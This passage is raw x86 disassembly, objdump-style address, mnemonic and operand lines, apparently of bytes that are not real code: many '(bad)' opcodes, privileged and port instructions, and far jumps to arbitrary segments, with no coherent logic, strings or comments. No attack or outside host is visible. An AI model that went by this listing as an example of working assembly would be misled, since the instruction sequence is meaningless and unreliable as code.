  40dca0:	fisttp DWORD PTR [ebp+0x28897a96]
  40dca6:	lea    esp,[edi+eax*2+0x4e8376f2]
  40dcad:	jo     0x40dcc5
  40dcaf:	pop    edi
  40dcb0:	inc    esp
  40dcb1:	aaa    
  40dcb2:	loop   0x40dd1b
  40dcb4:	(bad)  
  40dcb5:	xor    bl,BYTE PTR [edx]
  40dcb7:	fadd   QWORD PTR [edi]
  40dcb9:	sbb    al,0x27
  40dcbb:	mov    edi,0x5720a4a2
  40dcc0:	dec    esi
  40dcc1:	shl    DWORD PTR [edx+ecx*2-0x815114e],cl
  40dcc8:	stos   DWORD PTR es:[edi],eax
  40dcc9:	inc    ebp
  40dcca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dccb:	sub    BYTE PTR [ebp-0x18224350],dl
  40dcd1:	pop    ebx
  40dcd2:	fmul   DWORD PTR [ecx]
  40dcd4:	pop    esp
  40dcd5:	iret   
  40dcd6:	adc    ah,BYTE PTR [eax-0x7fd73434]
  40dcdc:	mov    bl,0x77
  40dcde:	cmp    BYTE PTR [ecx],0x9d
  40dce1:	jbe    0x40dd38
  40dce3:	or     BYTE PTR [eax-0x7c],dh
  40dce6:	into   
  40dce7:	into   
  40dce8:	clc    
  40dce9:	mov    al,0xca
  40dceb:	ret    0x4e0e
  40dcee:	jmp    0xd95811c9
  40dcf3:	bound  ebx,QWORD PTR ds:0x10c96da5
  40dcf9:	ror    DWORD PTR [ebp-0x539684f7],cl
  40dcff:	mov    ecx,0xdf5ba492
  40dd04:	adc    al,0xb6
  40dd06:	mov    ch,0x4a
  40dd08:	lods   al,BYTE PTR ds:[esi]
  40dd09:	and    al,0x96
  40dd0b:	push   cs
  40dd0c:	lds    esi,FWORD PTR [ebx-0x3]
  40dd0f:	dec    eax
  40dd10:	and    dh,BYTE PTR [ebx]
  40dd12:	call   0xeff1:0xc28202dc
  40dd19:	mov    al,BYTE PTR [esi-0x5407794c]
  40dd1f:	leave  
  40dd20:	test   al,0xe9
  40dd22:	xchg   esi,eax
  40dd23:	pop    es
  40dd24:	pop    ebp
  40dd25:	shl    BYTE PTR [edx+ecx*2+0x5],1
  40dd29:	rcr    DWORD PTR [eax],0xb1
  40dd2c:	pcmpeqd mm1,QWORD PTR [ebp+0x1d966317]
  40dd33:	out    dx,al
  40dd34:	int    0x8f
  40dd36:	xchg   DWORD PTR [ecx],eax
  40dd38:	xchg   ebx,eax
  40dd39:	(bad)  
  40dd3b:	mov    edx,0x9776d32c
  40dd40:	push   cs
  40dd41:	aad    0xfa
  40dd43:	and    BYTE PTR [edi],dl
  40dd45:	sub    BYTE PTR [eax],al
  40dd47:	add    esp,eax
  40dd49:	jle    0x40ddc3
  40dd4b:	adc    al,0x61
  40dd4d:	cmp    eax,0xa46a1e28
  40dd52:	push   esp
  40dd53:	test   al,0x97
  40dd55:	adc    ebx,esp
  40dd57:	push   ss
  40dd58:	mov    ?,WORD PTR [eax-0x2e]
  40dd5b:	retf   
  40dd5c:	outs   dx,DWORD PTR ds:[esi]
  40dd5d:	and    ebx,DWORD PTR [edi+0x65]
  40dd60:	inc    ebx
  40dd61:	sbb    al,0x24
  40dd63:	push   edi
  40dd64:	inc    esi
  40dd65:	cwde   
  40dd66:	aas    
  40dd67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd68:	shl    esi,1
  40dd6a:	cwde   
  40dd6b:	std    
  40dd6c:	push   esp
  40dd6d:	mul    DWORD PTR [edx+0x55]
  40dd70:	xor    BYTE PTR gs:0x2ec82ad8,0x24
  40dd78:	pushf  
  40dd79:	push   edi
  40dd7a:	in     eax,dx
  40dd7b:	mov    DWORD PTR [ecx],ebx
  40dd7d:	mov    al,0xc8
  40dd7f:	mov    ds:0x1ce31022,eax
  40dd84:	sub    BYTE PTR [eax],dl
  40dd86:	jbe    0x40dd83
  40dd88:	imul   eax,DWORD PTR [ecx-0x6ffe6ec],0x4490b028
  40dd92:	sbb    ah,dh
  40dd94:	repnz sub eax,0xf6dee6ed
  40dd9a:	scas   eax,DWORD PTR es:[edi]
  40dd9b:	push   0xb
  40dd9d:	push   eax
  40dd9e:	push   edx
  40dd9f:	arpl   di,sp
  40dda1:	add    BYTE PTR [eax-0x6ddade2d],0x86
  40dda8:	jle    0x40dddf
  40ddaa:	pop    ds
  40ddab:	xchg   ecx,eax
  40ddac:	jo     0x40dde4
  40ddae:	cs cs push esi
  40ddb1:	pop    esp
  40ddb2:	cmc    
  40ddb3:	jp     0x40de2b
  40ddb5:	ret    0xc33d
  40ddb8:	push   0xffffff85
  40ddba:	popa   
  40ddbb:	adc    al,0xd4
  40ddbd:	pop    ss
  40ddbe:	xor    al,0x23
  40ddc0:	dec    edx
  40ddc1:	mov    esp,fs
  40ddc3:	mov    bl,0x9
  40ddc5:	mov    bh,bh
  40ddc7:	adc    edx,edx
  40ddc9:	pop    eax
  40ddca:	and    BYTE PTR [eax],0x4b
  40ddcd:	retf   
  40ddce:	jmp    0x54c7:0xc701677b
  40ddd5:	jge    0x40ddec
  40ddd7:	mov    al,0xb0
  40ddd9:	aad    0x68
  40dddb:	xor    BYTE PTR gs:[eax+ebx*2-0x2a3bd959],dl
  40dde3:	adc    al,0xc
  40dde5:	mov    esi,0x92617de4
  40ddea:	test   esp,0x972c2606
  40ddf0:	jge    0x40de4e
  40ddf2:	pop    esi
  40ddf3:	add    BYTE PTR [edi],0x72
  40ddf6:	and    al,0xd8
  40ddf8:	jno    0x40de0f
  40ddfa:	outs   dx,DWORD PTR ds:[esi]
  40ddfb:	shr    BYTE PTR [esi],1
  40ddfd:	arpl   WORD PTR [eax+0x5e4a504c],bp
  40de03:	das    
  40de04:	cmp    DWORD PTR [ebp+edi*2-0x5],edx
  40de08:	or     ebp,DWORD PTR [edx]
  40de0a:	xor    eax,0x41715d6
  40de0f:	in     al,dx
  40de10:	and    eax,0x46bae185
  40de15:	mov    ebp,0x907c936a
  40de1a:	sub    BYTE PTR [edx-0x279de7d9],ch
  40de20:	lea    edx,[edi]
  40de22:	sbb    dh,BYTE PTR [esi+0x7d]
  40de25:	xchg   esp,eax
  40de26:	outs   dx,DWORD PTR ds:[esi]
  40de27:	dec    esi
  40de28:	fidiv  DWORD PTR [eax+0x4]
  40de2b:	out    0xc2,al
  40de2d:	or     BYTE PTR [ebp-0x5b],ah
  40de30:	es jo  0x40de73
  40de33:	push   0x260a208e
  40de38:	repz jae 0x40de6f
  40de3b:	and    DWORD PTR [ebp+0x3f96f3c6],ebp
  40de41:	fs daa 
  40de43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de44:	into   
  40de45:	mov    edx,0x74c97279
  40de4a:	shl    esp,0x8c
  40de4d:	dec    ebx
  40de4e:	das    
  40de4f:	and    DWORD PTR ds:0x387250b,esi
  40de55:	sbb    eax,0xd2e5c866
  40de5a:	pop    ebx
  40de5b:	(bad)  
  40de5d:	repz push cs
  40de5f:	sbb    DWORD PTR [ecx],esp
  40de61:	and    cl,bl
  40de63:	retf   
  40de64:	adc    eax,0x3e617848
  40de69:	rcr    al,1
  40de6b:	push   edi
  40de6c:	jb     0x40de60
  40de6e:	loope  0x40decd
  40de70:	push   ebp
  40de71:	mov    ds:0x81f4120f,al
  40de76:	(bad)  
  40de77:	sbb    al,0xc7
  40de79:	push   esi
  40de7a:	pop    edx
  40de7b:	sahf   
  40de7c:	or     eax,0x918b3410
  40de81:	out    dx,eax
  40de82:	bound  esp,QWORD PTR [ebp+eax*2-0x49]
  40de86:	fisttp DWORD PTR [edx+0x1cfb8727]
  40de8c:	pop    ds
  40de8d:	loopne 0x40de38
  40de8f:	int3   
  40de90:	jmp    0x409b0cb8
  40de95:	xchg   ch,dh
  40de97:	enter  0xb5e6,0x46
  40de9b:	dec    eax
  40de9c:	ffree  st(6)
  40de9e:	pop    ds
  40de9f:	xchg   ebp,eax
  40dea0:	(bad)  
  40dea1:	mov    esp,0x6f27ae10
  40dea6:	add    esp,edx
  40dea8:	sub    eax,0xc210fcbe
  40dead:	in     eax,dx
  40deae:	cmp    DWORD PTR [ecx+eiz*8],ebx
  40deb1:	repnz sub bh,BYTE PTR [ecx]
  40deb4:	push   cs
  40deb5:	bound  esp,QWORD PTR [edx]
  40deb7:	push   ebp
  40deb8:	pop    esi
  40deb9:	rcl    DWORD PTR [bp+si-0x3899],0x28
  40debf:	xlat   BYTE PTR ds:[ebx]
  40dec0:	and    edi,ebp
  40dec2:	fiadd  WORD PTR [edx-0x42759162]
  40dec8:	jb     0x40dea7
  40deca:	ss mov dl,0xf7
  40decd:	into   
  40dece:	xchg   esi,eax
  40decf:	nop
  40ded0:	adc    eax,0xa6697e8b
  40ded5:	std    
  40ded6:	and    BYTE PTR [eax+0x7295ec29],0x58
  40dedd:	dec    esi
  40dede:	stos   BYTE PTR es:[edi],al
  40dedf:	and    BYTE PTR [eax-0x36],0x59
  40dee3:	mov    BYTE PTR [eax+0x1563dd1b],cl
  40dee9:	xchg   ebp,eax
  40deea:	jmp    0x165c:0xfcf0b93
  40def1:	or     BYTE PTR ds:0x1b0753c2,bh
  40def7:	ret    0xca76
  40defa:	pop    esi
  40defb:	call   DWORD PTR [eax]
  40defd:	sbb    ecx,ebx
  40deff:	xor    BYTE PTR [ecx],0x9d
  40df02:	std    
  40df03:	pop    ds
  40df04:	std    
  40df05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df06:	call   0x4105:0x3ea3cff0
  40df0d:	jmp    0x2301:0xc39354c0
  40df14:	fstp   st(0)
  40df16:	and    DWORD PTR [edi],esp
  40df18:	sbb    edi,esp
  40df1a:	shl    BYTE PTR [ebx+0x68],cl
  40df1d:	(bad)  
  40df1e:	ja     0x40df22
  40df20:	aaa    
  40df21:	ds cdq 
  40df23:	xchg   BYTE PTR ss:[ebx],cl
  40df26:	mov    al,ds:0xd3cd2de6
  40df2b:	fucomi st,st(4)
  40df2d:	out    dx,eax
  40df2e:	adc    ah,BYTE PTR [esi+eiz*4]
  40df31:	stos   DWORD PTR es:[edi],eax
  40df32:	fwait
  40df33:	xor    DWORD PTR ds:0x830e55ae,edi
  40df39:	jg     0x40ded2
  40df3b:	outs   dx,DWORD PTR ds:[esi]
  40df3c:	inc    esp
  40df3d:	pop    ds
  40df3e:	retf   
  40df3f:	push   ebp
  40df40:	icebp  
  40df41:	xchg   BYTE PTR [edi+ecx*2+0x17],cl
  40df45:	cmp    ah,dh
  40df47:	pop    esp
  40df48:	xchg   esi,eax
  40df49:	cmp    eax,0x84fca739
  40df4e:	xor    DWORD PTR [ecx-0x66d0757d],0x4b
  40df55:	bound  esi,QWORD PTR [edx]
  40df57:	sbb    eax,0xcf9f8143
  40df5c:	jae    0x40dfa4
  40df5e:	push   eax
  40df5f:	inc    ebx
  40df60:	pop    ds
  40df61:	mov    eax,0xdec2fa
  40df66:	jmp    0x40dfc4
  40df68:	std    
  40df69:	sahf   
  40df6a:	mov    cl,0x4b
  40df6c:	or     esi,DWORD PTR [ebp+0x7]
  40df6f:	bound  edx,QWORD PTR cs:[ebp+edi*1+0x1e]
  40df74:	dec    edx
  40df75:	not    ecx
  40df77:	xchg   esi,eax
  40df78:	test   al,0x56
  40df7a:	pop    esi
  40df7b:	ss pop esi
  40df7d:	pop    ss
  40df7e:	adc    al,0x5a
  40df80:	pop    eax
  40df81:	sahf   
  40df82:	and    cl,BYTE PTR [ebx+0x35918030]
  40df88:	add    al,0x50
  40df8a:	sahf   
  40df8b:	mov    dl,0xc5
  40df8d:	mov    edx,0x2741d88a
  40df92:	std    
  40df93:	(bad)
  40df97:	mov    cl,0x8f
  40df99:	outs   dx,BYTE PTR ds:[esi]
  40df9a:	shl    BYTE PTR [ebx+esi*4+0x6e],cl
  40df9e:	adc    al,0xad
  40dfa0:	loop   0x40df81
  40dfa2:	loope  0x40dfb2
  40dfa4:	mov    ebp,0xae8a574c
  40dfa9:	sub    eax,0x9eba92a9
  40dfae:	int3   
  40dfaf:	jg     0x40dfdd
  40dfb1:	xchg   DWORD PTR [edi+0x5a40889f],ebp
  40dfb7:	clc    
  40dfb8:	imul   edi,ebp,0x46
  40dfbb:	pop    ecx
  40dfbc:	push   cx
  40dfbe:	test   eax,0xd2dddee2
  40dfc3:	inc    ebp
  40dfc4:	xor    ecx,DWORD PTR [ecx+0x44199c4e]
  40dfca:	jl     0x40e02e
  40dfcc:	into   
  40dfcd:	adc    eax,0xbb4ccef9
  40dfd2:	dec    ebp
  40dfd3:	sbb    bh,BYTE PTR [edx+0x3a]
  40dfd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfd7:	fucompp 
  40dfd9:	repz inc edi
  40dfdb:	nop
  40dfdc:	adc    DWORD PTR [edx+0x6a],eax
  40dfdf:	icebp  
  40dfe0:	adc    BYTE PTR [esi+0x2d],ch
  40dfe3:	iret   
  40dfe4:	(bad)  [edi]
  40dfe6:	(bad)  
  40dfe7:	dec    esp
  40dfe8:	shl    BYTE PTR [eax-0x3f05a8c],1
  40dfee:	test   BYTE PTR [edx+edi*1+0x5b],dh
  40dff2:	and    esp,edx
  40dff4:	loop   0x40e02b
  40dff6:	mov    ebp,0x8acb6da3
  40dffb:	lods   eax,DWORD PTR ds:[esi]
  40dffc:	and    DWORD PTR [edi-0x7a86b6e0],ebx
  40e002:	sub    al,0xc5
  40e004:	(bad)  
  40e006:	rol    ecx,1
  40e008:	scas   eax,DWORD PTR es:[edi]
  40e009:	xchg   esi,eax
  40e00a:	add    eax,DWORD PTR [ebx-0x5a]
  40e00d:	leave  
  40e00e:	push   ss
  40e00f:	stos   DWORD PTR es:[edi],eax
  40e010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e011:	mov    WORD PTR [ebx],ss
  40e013:	fdivr  QWORD PTR [eax-0x7312b562]
  40e019:	aam    0x57
  40e01b:	enter  0x5514,0x43
  40e01f:	push   esp
  40e020:	sbb    esi,DWORD PTR [edx-0xb0de847]
  40e026:	or     ch,cl
  40e028:	sub    DWORD PTR [esi+0x16],ecx
  40e02b:	lahf   
  40e02c:	clc    
  40e02d:	retf   
  40e02e:	sbb    BYTE PTR [eax+0x28dec9b0],cl
  40e034:	ja     0x40e094
  40e036:	sbb    BYTE PTR [esi+0x1afce20b],0x2a
  40e03d:	out    dx,al
  40e03e:	popf   
  40e03f:	(bad)  
  40e040:	or     al,0xbd
  40e042:	mov    esi,0xb4d2ef4a
  40e047:	sbb    al,0x9a
  40e049:	(bad)  
  40e04b:	(bad)  
  40e04c:	push   ds
  40e04d:	dec    ebp
  40e04e:	jne    0x40dfd7
  40e050:	dec    ebp
  40e051:	and    eax,0x75860d37
  40e056:	(bad)  [edx]
  40e058:	dec    edi
  40e059:	xchg   ecx,eax
  40e05a:	xchg   ebp,eax
  40e05b:	sub    BYTE PTR [ecx-0x76],ah
  40e05e:	je     0x40e0a5
  40e060:	mov    cl,0xf7
  40e062:	lods   eax,DWORD PTR ds:[esi]
  40e063:	pusha  
  40e064:	and    dl,ah
  40e066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e067:	and    eax,0xb19bb7de
  40e06c:	fucomip st,st(3)
  40e06e:	xrstors [edi+eax*8+0x75e56767]
  40e076:	xor    eax,0x9b8474f3
  40e07b:	adc    eax,0x892fa0c3
  40e080:	mov    esi,DWORD PTR [ebx*4+0x13df3df0]
  40e087:	mov    ch,BYTE PTR [ebx]
  40e089:	pop    esi
  40e08a:	fchs   
  40e08c:	xor    eax,0xa707f250
  40e091:	shl    bh,1
  40e093:	pop    ss
  40e094:	mov    fs,WORD PTR [edx]
  40e096:	mov    eax,ebx
  40e098:	push   eax
  40e099:	jge    0x40e0d0
  40e09b:	in     eax,0x2b
  40e09d:	xlat   BYTE PTR ds:[ebx]
  40e09e:	mov    eax,ds:0x175d2af6
  40e0a3:	mov    DWORD PTR [esi+0x5a],ebp
  40e0a6:	loope  0x40e053
  40e0a8:	out    dx,eax
  40e0a9:	and    edi,0x656db6c7
  40e0af:	sbb    al,0x10
  40e0b1:	(bad)  
  40e0b2:	push   ecx
  40e0b3:	mov    edi,DWORD PTR [edi]
  40e0b5:	push   edi
  40e0b6:	push   esi
  40e0b7:	enter  0xfba2,0xcc
  40e0bb:	sub    esp,eax
  40e0bd:	in     eax,dx
  40e0be:	add    eax,0x5512489c
  40e0c3:	jp     0x40e0b9
  40e0c5:	xchg   edx,eax
  40e0c6:	daa    
  40e0c7:	push   edi
  40e0c8:	push   edi
  40e0c9:	aam    0x1
  40e0cb:	xchg   dl,bh
  40e0cd:	fisubr WORD PTR es:[eax-0xb557b5f]
  40e0d4:	js     0x40e0ca
  40e0d6:	in     eax,0x81
  40e0d8:	in     al,0xc2
  40e0da:	push   es
  40e0db:	std    
  40e0dc:	retf   0xa212
  40e0df:	and    DWORD PTR [edx+eax*2+0x2c],ebp
  40e0e3:	jo     0x40e0c8
  40e0e5:	push   ebp
  40e0e6:	mov    ds:0xb669d689,al
  40e0eb:	enter  0xff2d,0x2a
  40e0ef:	jmp    0x5a4c:0xa1cc700b
  40e0f6:	or     al,BYTE PTR [edx-0x13]
  40e0f9:	dec    ebx
  40e0fa:	adc    eax,0x7ae25d21
  40e0ff:	mov    dh,0xa8
  40e101:	sbb    eax,0x9f61e24b
  40e106:	outs   dx,BYTE PTR ds:[esi]
  40e107:	mov    al,ds:0x5e932b8e
  40e10c:	push   es
  40e10d:	in     eax,0x51
  40e10f:	jo     0x40e121
  40e111:	jp     0x40e174
  40e113:	es (bad) 
  40e115:	gs jmp 0xa99b:0x42031e72
  40e11d:	adc    al,0x64
  40e11f:	xor    DWORD PTR [edx],ebp
  40e121:	aad    0xea
  40e123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e124:	pop    ecx
  40e125:	into   
  40e126:	add    bh,dh
  40e128:	jg     0x40e186
  40e12a:	stos   BYTE PTR es:[edi],al
  40e12b:	xchg   BYTE PTR [ebx],ch
  40e12d:	xor    eax,0x7991945f
  40e132:	mov    dh,0x61
  40e134:	mov    eax,ds:0xaed211c7
  40e139:	(bad)  
  40e13a:	scas   al,BYTE PTR es:[edi]
  40e13b:	aaa    
  40e13c:	adc    ecx,DWORD PTR [ebp+0x20]
  40e13f:	push   0x70431402
  40e144:	loop   0x40e132
  40e146:	aas    
  40e147:	cmc    
  40e148:	rsm    
  40e14a:	pop    edx
  40e14b:	test   DWORD PTR [ecx],edx
  40e14d:	jns    0x40e16a
  40e14f:	pusha  
  40e150:	xor    esp,DWORD PTR [ebx]
  40e152:	adc    dh,BYTE PTR [ebp-0x334fc6a1]
  40e158:	out    0x7a,eax
  40e15a:	jbe    0x40e163
  40e15c:	mov    esp,0xd71aa70e
  40e161:	mov    eax,0xe9eac4be
  40e166:	ins    DWORD PTR es:[edi],dx
  40e167:	adc    esi,DWORD PTR [ebx+0x3be12f85]
  40e16d:	rcr    DWORD PTR [eax],1
  40e16f:	add    bl,ah
  40e171:	xchg   esi,eax
  40e172:	dec    eax
  40e173:	ins    DWORD PTR es:[edi],dx
  40e174:	or     al,0xc3
  40e176:	cmp    esp,esi
  40e178:	test   DWORD PTR [ebp+0x5af21840],esi
  40e17e:	out    0xaf,eax
  40e180:	mov    al,0xd1
  40e182:	sub    eax,ebp
  40e184:	scas   al,BYTE PTR es:[edi]
  40e185:	imul   esp,DWORD PTR [ecx-0x2d],0x5605d851
  40e18c:	sahf   
  40e18d:	xchg   ecx,eax
  40e18e:	mov    ebp,0xc8d10948
  40e193:	sti    
  40e194:	ret    0x620d
  40e197:	xchg   edx,eax
  40e198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e199:	lods   eax,DWORD PTR ds:[esi]
  40e19a:	mov    edi,0x2fcb5b87
  40e19f:	fistp  DWORD PTR [esi+ebx*8+0x73]
  40e1a3:	mul    DWORD PTR [eax+0x467540b6]
  40e1a9:	and    dl,BYTE PTR [ebp+eiz*1-0x5b66eca]
  40e1b0:	out    dx,al
  40e1b1:	imul   DWORD PTR [edi]
  40e1b3:	fnstenv [edi+edx*4]
  40e1b6:	add    eax,0xbc08f945
  40e1bb:	mov    ebx,0xd529aa19
  40e1c0:	sbb    al,0xe9
  40e1c2:	push   0x24
  40e1c4:	arpl   WORD PTR [edi],ax
  40e1c6:	mov    dh,0xd6
  40e1c8:	push   ebp
  40e1c9:	xor    ebx,DWORD PTR [eax]
  40e1cb:	mov    bh,0x25
  40e1cd:	mov    bh,0x9d
  40e1cf:	cmp    eax,0x555b571f
  40e1d4:	push   ebx
  40e1d5:	xchg   esp,eax
  40e1d6:	mov    bh,0x6f
  40e1d8:	sub    eax,0x819619e3
  40e1dd:	outs   dx,BYTE PTR ds:[esi]
  40e1de:	xchg   ebx,eax
  40e1df:	jmp    0xd305b53a
  40e1e4:	xor    bl,BYTE PTR [ebx-0x7c]
  40e1e7:	pop    ebp
  40e1e8:	out    dx,al
  40e1e9:	pop    ds
  40e1ea:	js     0x40e217
  40e1ec:	ins    BYTE PTR es:[edi],dx
  40e1ed:	xchg   ebp,eax
  40e1ee:	cld    
  40e1ef:	shl    esi,0x73
  40e1f2:	push   0x9bec9d72
  40e1f7:	pop    ds
  40e1f8:	into   
  40e1f9:	loop   0x40e26d
  40e1fb:	mov    ch,0x6d
  40e1fd:	cmp    al,0xb0
  40e1ff:	bound  ecx,QWORD PTR [edi]
  40e201:	or     ecx,DWORD PTR [ebp+0x2c]
  40e204:	pop    es
  40e205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e206:	push   ebx
  40e207:	push   esi
  40e208:	inc    ebp
  40e209:	add    al,0x2b
  40e20b:	(bad)  
  40e20c:	cdq    
  40e20d:	pusha  
  40e20e:	adc    esi,DWORD PTR [edi-0x9]
  40e211:	jne    0x40e1a9
  40e213:	dec    ebx
  40e214:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40e216:	cs cmp eax,0xe4aba142
  40e21c:	sub    al,0x9b
  40e21e:	lock sbb ebx,edi
  40e221:	push   ebx
  40e222:	and    BYTE PTR [ebp+0x28],0x46
  40e226:	xlat   BYTE PTR es:[ebx]
  40e228:	repnz pop es
  40e22a:	ficomp DWORD PTR [edi-0x51]
  40e22d:	pop    edx
  40e22e:	daa    
  40e22f:	aad    0xa2
  40e231:	pop    eax
  40e232:	mov    DWORD PTR [esi-0x75f20f6b],edi
  40e238:	ret    0x4404
  40e23b:	push   edx
  40e23c:	mov    dh,0x38
  40e23e:	xchg   BYTE PTR [esi],ch
  40e240:	leave  
  40e241:	jnp    0x40e224
  40e243:	jg     0x40e248
  40e245:	in     al,dx
  40e246:	les    eax,FWORD PTR [edi]
  40e248:	adc    eax,0x2eb1c096
  40e24d:	jmp    0x6e22b2c8
  40e252:	or     cl,BYTE PTR [edi-0x35]
  40e255:	cmp    ebp,DWORD PTR [edi+0x1a]
  40e258:	mov    al,ds:0x5b2dac38
  40e25d:	dec    esp
  40e25e:	iret   
  40e25f:	mov    bl,0xec
  40e261:	xor    edx,ecx
  40e263:	and    DWORD PTR [edx+0x1c],esp
  40e266:	(bad)  
  40e267:	out    dx,eax
  40e268:	adc    BYTE PTR [ecx+0x40],bl
  40e26b:	cmp    esp,esp
  40e26d:	jg     0x40e2aa
  40e26f:	xor    ah,BYTE PTR [ebp+0x41]
  40e272:	je     0x40e2a2
  40e274:	ja     0x40e1f6
  40e276:	(bad)  
  40e277:	fsub   QWORD PTR [bx]
  40e27a:	outs   dx,DWORD PTR ds:[esi]
  40e27b:	mov    DWORD PTR [edx-0x64],edi
  40e27e:	xor    DWORD PTR [edi+0x13b8c3a4],eax
  40e284:	xchg   edx,eax
  40e285:	mov    edi,0x1df5fd7e
  40e28a:	in     al,dx
  40e28b:	jnp    0x40e2b3
  40e28d:	mov    BYTE PTR [edi+0x46ef20f1],dh
  40e293:	sbb    bl,BYTE PTR ds:0x95186d07
  40e299:	push   ebp
  40e29a:	loope  0x40e282
  40e29c:	out    0x5e,al
  40e29e:	mov    edi,0x98856a2f
  40e2a3:	lods   al,BYTE PTR ds:[esi]
  40e2a4:	ret    
  40e2a5:	or     eax,0xcd96b7ae
  40e2aa:	cmc    
  40e2ab:	xor    BYTE PTR [esi+0x28],0x1b
  40e2af:	(bad)  
  40e2b0:	repz enter 0x3563,0xa7
  40e2b5:	mov    es,WORD PTR [edi+edx*1]
  40e2b8:	jb     0x40e2ca
  40e2ba:	pusha  
  40e2bb:	ret    
  40e2bc:	adc    al,0x27
  40e2be:	cmp    BYTE PTR [edx],cl
  40e2c0:	jmp    0xe084:0xd61cbe12
  40e2c7:	xor    BYTE PTR [ebx],bl
  40e2c9:	jae    0x40e2e5
  40e2cb:	push   cs
  40e2cc:	in     eax,dx
  40e2cd:	dec    esi
  40e2ce:	or     al,0xa1
  40e2d0:	cmp    al,0x5d
  40e2d2:	test   DWORD PTR fs:[eax+0x56],ebp
  40e2d6:	icebp  
  40e2d7:	pushf  
  40e2d8:	aad    0xc7
  40e2da:	push   edi
  40e2db:	xchg   esp,eax
  40e2dc:	push   edx
  40e2dd:	mov    ebp,0x251c6d6c
  40e2e2:	ret    
  40e2e3:	sahf   
  40e2e4:	and    BYTE PTR [ecx-0x10],ch
  40e2e7:	dec    ecx
  40e2e8:	sti    
  40e2e9:	leave  
  40e2ea:	nop
  40e2eb:	jl     0x40e2c6
  40e2ed:	sbb    BYTE PTR [esi-0x3c178997],ch
  40e2f3:	cmp    ch,bh
  40e2f5:	iret   
  40e2f6:	fisub  DWORD PTR [eax+0x30]
  40e2f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2fa:	outs   dx,BYTE PTR ds:[esi]
  40e2fb:	idiv   BYTE PTR [eax+0x61575ac3]
  40e301:	aam    0x9
  40e303:	sub    al,0xfe
  40e305:	mov    ss,WORD PTR [ebp+0x32d35343]
  40e30b:	push   0xa8d1bd9
  40e310:	cmp    al,0xa2
  40e312:	jp     0x40e312
  40e314:	pop    esp
  40e316:	sbb    BYTE PTR [edi-0x606f46b7],dh
  40e31c:	jno    0x40e38b
  40e31e:	fwait
  40e31f:	sbb    DWORD PTR ds:[ecx+0x63c703a9],0x43
  40e327:	push   es
  40e328:	jo     0x40e2e6
  40e32a:	out    dx,al
  40e32b:	in     eax,0x60
  40e32d:	xor    edi,DWORD PTR [esi+0xf]
  40e330:	adc    bl,BYTE PTR [edx]
  40e332:	repz jge 0x40e357
  40e335:	call   0xa92e:0x56d4f439
  40e33c:	jne    0x40e32e
  40e33e:	retf   0x7596
  40e341:	inc    esp
  40e342:	mov    fs,WORD PTR [ecx-0xc]
  40e345:	add    eax,0xcaac2dc8
  40e34a:	push   ss
  40e34b:	xor    DWORD PTR [edi],ebx
  40e34d:	pop    edi
  40e34e:	adc    al,0x76
  40e350:	pusha  
  40e351:	lods   al,BYTE PTR ds:[esi]
  40e352:	push   ecx
  40e353:	jnp    0x40e398
  40e355:	out    dx,al
  40e356:	or     BYTE PTR [eax],ch
  40e358:	test   cl,0xe1
  40e35b:	std    
  40e35c:	cmp    DWORD PTR ds:0x5a8d1c76,esi
  40e362:	add    BYTE PTR [edx+0x1a7e1b80],ah
  40e368:	stc    
  40e369:	mov    bh,0x10
  40e36b:	loop   0x40e382
  40e36d:	js     0x40e3b7
  40e36f:	stos   DWORD PTR es:[edi],eax
  40e370:	(bad)  
  40e372:	rcl    DWORD PTR [edx-0x33],0xa
  40e376:	or     ebp,ebp
  40e378:	daa    
  40e379:	mov    DWORD PTR [eax-0x40],esi
  40e37c:	sahf   
  40e37d:	cs and al,0x6f
  40e380:	mov    dh,0x75
  40e382:	rol    BYTE PTR [ebp+0xa],1
  40e385:	jl     0x40e35c
  40e387:	es std 
  40e389:	jmp    0x485a0c28
  40e38e:	mov    bh,0x5b
  40e390:	out    0x58,eax
  40e392:	outs   dx,BYTE PTR ds:[esi]
  40e393:	dec    eax
  40e394:	lea    ecx,[ebx-0x6be94c59]
  40e39a:	jmp    0x400c:0x61728ad7
  40e3a1:	fucom  st(7)
  40e3a3:	pop    ss
  40e3a4:	sti    
  40e3a5:	retf   0x418
  40e3a8:	retf   0x3540
  40e3ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3ac:	outs   dx,BYTE PTR ds:[esi]
  40e3ad:	vrsqrtps ymm4,YMMWORD PTR [esi+0x50]
  40e3b2:	sub    esi,DWORD PTR [ecx+0x5f]
  40e3b5:	iret   
  40e3b6:	(bad)
  40e3b9:	adc    al,0x71
  40e3bb:	ins    BYTE PTR es:[edi],dx
  40e3bc:	mov    bl,0x86
  40e3be:	mov    ecx,0x9495cf2
  40e3c3:	mov    bl,al
  40e3c5:	pop    edi
  40e3c6:	pop    edx
  40e3c7:	aas    
  40e3c8:	fistp  QWORD PTR [esi+0x7cabc6a2]
  40e3ce:	add    eax,0x404d5bbb
  40e3d3:	or     al,0x55
  40e3d5:	mov    dl,0x36
  40e3d7:	lods   eax,DWORD PTR ds:[esi]
  40e3d8:	frstor [edx]
  40e3da:	ds or  al,0x9c
  40e3dd:	sbb    DWORD PTR [edx],0x4f
  40e3e0:	xchg   esp,eax
  40e3e1:	sti    
  40e3e2:	push   0xffffffc5
  40e3e4:	leave  
  40e3e5:	arpl   WORD PTR [ebx+eax*8],ax
  40e3e8:	outs   dx,BYTE PTR ds:[esi]
  40e3e9:	mov    esp,0xb992fc0c
  40e3ef:	scas   al,BYTE PTR es:[edi]
  40e3f0:	shl    DWORD PTR [ecx+ebx*2+0x15],0x9
  40e3f5:	scas   eax,DWORD PTR es:[edi]
  40e3f6:	fdivr  st(2),st
  40e3f8:	xchg   esi,eax
  40e3f9:	pop    esp
  40e3fa:	or     ah,BYTE PTR [esi-0x69]
